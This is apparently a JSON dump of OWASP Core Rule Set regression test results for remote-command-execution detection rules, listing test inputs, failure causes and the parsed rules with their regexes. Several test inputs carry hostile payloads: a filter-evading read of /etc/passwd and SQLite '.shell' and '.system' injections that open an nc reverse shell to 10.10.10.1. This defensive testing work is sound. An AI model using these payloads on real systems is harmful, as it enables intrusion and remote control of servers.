          "value" : 932200
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "RCE Bypass Technique"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.932200_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.932200_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932207",
    "test_id" : 7,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932207.yaml",
    "description" : "Referer with command injection in URL Fragment",
    "cause" : "nothing checked for test 7",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=932207 - RCE Bypass Technique", "phase=1 rule_id=932237 - Remote Command Execution: Unix Shell Code Found in REQUEST_HEADERS" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "Referer with command injection in URL Fragment",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Referer" : "https://www.google.com/?param=something#x=foo;cat$u+/etc$u/passwd"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.0"
        },
        "output" : {
          "log" : {
            "match_regex" : "Matched Data: \\$u found within REQUEST_HEADERS:Referer: #x=foo;cat\\$u /etc\\$u/passwd"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932207,
      "phase" : 1,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Rule 932207 ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Sibling of 932200 targeting fragments in the Referer header."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The last chain prevents FPs against the \"Scroll to text fragment\" browser feature"
        }, {
          "type" : "Comment",
          "text" : " (https://wicg.github.io/scroll-to-text-fragment/)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932207.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932207"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "#.*"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932207
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "RCE Bypass Technique"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.932207_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.932207_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932210",
    "test_id" : 1,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932210.yaml",
    "description" : ";\\n.shell%20nc%2010.10.10.1%206666%20-e%20sh\\n",
    "cause" : "failed expect_id check: 932210 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : ";\\n.shell%20nc%2010.10.10.1%206666%20-e%20sh\\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=;\\n.shell%20nc%2010.10.10.1%206666%20-e%20sh\\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Sqlite System Command Execution ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule prevents execution of SQLite CLI commands like .system and .shell"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " You can find a vulnerable script and a sample payload here:"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/qxxxb/ctf/tree/master/2021/zer0pts_ctf/baby_sqli"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " List of sqlite3 CLI commands:"
        }, {
          "type" : "Comment",
          "text" : " https://sqlite.org/cli.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932210.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932210"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : ";[\\s\\x0b]*\\.[\\s\\x0b]*[\\\"']?(?:a(?:rchive|uth)|b(?:a(?:ckup|il)|inary)|c(?:d|h(?:anges|eck)|lone|onnection)|d(?:atabases|b(?:config|info)|ump)|e(?:cho|qp|x(?:cel|it|p(?:ert|lain)))|f(?:ilectrl|ullschema)|he(?:aders|lp)|i(?:mpo(?:rt|ster)|ndexes|otrace)|l(?:i(?:mi|n)t|o(?:ad|g))|(?:mod|n(?:onc|ullvalu)|unmodul)e|o(?:nce|pen|utput)|p(?:arameter|r(?:int|o(?:gress|mpt)))|quit|re(?:ad|cover|store)|s(?:ave|c(?:anstats|hema)|e(?:lftest|parator|ssion)|h(?:a3sum|ell|ow)?|tats|ystem)|t(?:ables|estc(?:ase|trl)|ime(?:out|r)|race)|vfs(?:info|list|name)|width)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "escapeSeqDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "compressWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: SQLite System Command Execution"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932210",
    "test_id" : 2,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932210.yaml",
    "description" : "%22;\\n.%20shell%20nc%2010.10.10.1%206666%20-e%20sh\\n",
    "cause" : "failed expect_id check: 932210 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "%22;\\n.%20shell%20nc%2010.10.10.1%206666%20-e%20sh\\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%22;\\n.%20shell%20nc%2010.10.10.1%206666%20-e%20sh\\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Sqlite System Command Execution ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule prevents execution of SQLite CLI commands like .system and .shell"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " You can find a vulnerable script and a sample payload here:"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/qxxxb/ctf/tree/master/2021/zer0pts_ctf/baby_sqli"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " List of sqlite3 CLI commands:"
        }, {
          "type" : "Comment",
          "text" : " https://sqlite.org/cli.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932210.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932210"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : ";[\\s\\x0b]*\\.[\\s\\x0b]*[\\\"']?(?:a(?:rchive|uth)|b(?:a(?:ckup|il)|inary)|c(?:d|h(?:anges|eck)|lone|onnection)|d(?:atabases|b(?:config|info)|ump)|e(?:cho|qp|x(?:cel|it|p(?:ert|lain)))|f(?:ilectrl|ullschema)|he(?:aders|lp)|i(?:mpo(?:rt|ster)|ndexes|otrace)|l(?:i(?:mi|n)t|o(?:ad|g))|(?:mod|n(?:onc|ullvalu)|unmodul)e|o(?:nce|pen|utput)|p(?:arameter|r(?:int|o(?:gress|mpt)))|quit|re(?:ad|cover|store)|s(?:ave|c(?:anstats|hema)|e(?:lftest|parator|ssion)|h(?:a3sum|ell|ow)?|tats|ystem)|t(?:ables|estc(?:ase|trl)|ime(?:out|r)|race)|vfs(?:info|list|name)|width)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "escapeSeqDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "compressWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: SQLite System Command Execution"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932210",
    "test_id" : 3,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932210.yaml",
    "description" : ";\\n.system%20nc%2010.10.10.1%206666%20-e%20sh\\n",
    "cause" : "failed expect_id check: 932210 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : ";\\n.system%20nc%2010.10.10.1%206666%20-e%20sh\\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=;\\n.system%20nc%2010.10.10.1%206666%20-e%20sh\\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Sqlite System Command Execution ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule prevents execution of SQLite CLI commands like .system and .shell"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " You can find a vulnerable script and a sample payload here:"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/qxxxb/ctf/tree/master/2021/zer0pts_ctf/baby_sqli"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " List of sqlite3 CLI commands:"
        }, {
          "type" : "Comment",
          "text" : " https://sqlite.org/cli.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932210.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932210"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : ";[\\s\\x0b]*\\.[\\s\\x0b]*[\\\"']?(?:a(?:rchive|uth)|b(?:a(?:ckup|il)|inary)|c(?:d|h(?:anges|eck)|lone|onnection)|d(?:atabases|b(?:config|info)|ump)|e(?:cho|qp|x(?:cel|it|p(?:ert|lain)))|f(?:ilectrl|ullschema)|he(?:aders|lp)|i(?:mpo(?:rt|ster)|ndexes|otrace)|l(?:i(?:mi|n)t|o(?:ad|g))|(?:mod|n(?:onc|ullvalu)|unmodul)e|o(?:nce|pen|utput)|p(?:arameter|r(?:int|o(?:gress|mpt)))|quit|re(?:ad|cover|store)|s(?:ave|c(?:anstats|hema)|e(?:lftest|parator|ssion)|h(?:a3sum|ell|ow)?|tats|ystem)|t(?:ables|estc(?:ase|trl)|ime(?:out|r)|race)|vfs(?:info|list|name)|width)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "escapeSeqDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "compressWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: SQLite System Command Execution"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932210",
    "test_id" : 4,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932210.yaml",
    "description" : ";\\n.databases",
    "cause" : "failed expect_id check: 932210 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : ";\\n.databases",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=;\\n.databases",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Sqlite System Command Execution ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule prevents execution of SQLite CLI commands like .system and .shell"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " You can find a vulnerable script and a sample payload here:"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/qxxxb/ctf/tree/master/2021/zer0pts_ctf/baby_sqli"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " List of sqlite3 CLI commands:"
        }, {
          "type" : "Comment",
          "text" : " https://sqlite.org/cli.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932210.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932210"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : ";[\\s\\x0b]*\\.[\\s\\x0b]*[\\\"']?(?:a(?:rchive|uth)|b(?:a(?:ckup|il)|inary)|c(?:d|h(?:anges|eck)|lone|onnection)|d(?:atabases|b(?:config|info)|ump)|e(?:cho|qp|x(?:cel|it|p(?:ert|lain)))|f(?:ilectrl|ullschema)|he(?:aders|lp)|i(?:mpo(?:rt|ster)|ndexes|otrace)|l(?:i(?:mi|n)t|o(?:ad|g))|(?:mod|n(?:onc|ullvalu)|unmodul)e|o(?:nce|pen|utput)|p(?:arameter|r(?:int|o(?:gress|mpt)))|quit|re(?:ad|cover|store)|s(?:ave|c(?:anstats|hema)|e(?:lftest|parator|ssion)|h(?:a3sum|ell|ow)?|tats|ystem)|t(?:ables|estc(?:ase|trl)|ime(?:out|r)|race)|vfs(?:info|list|name)|width)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "escapeSeqDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "compressWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: SQLite System Command Execution"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932230",
    "test_id" : 31,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932230.yaml",
    "description" : "System Command Injection test for BB finding 935E1D91",
    "cause" : "failed expect_id check: 932230 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 31,
      "desc" : "System Command Injection test for BB finding 935E1D91",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
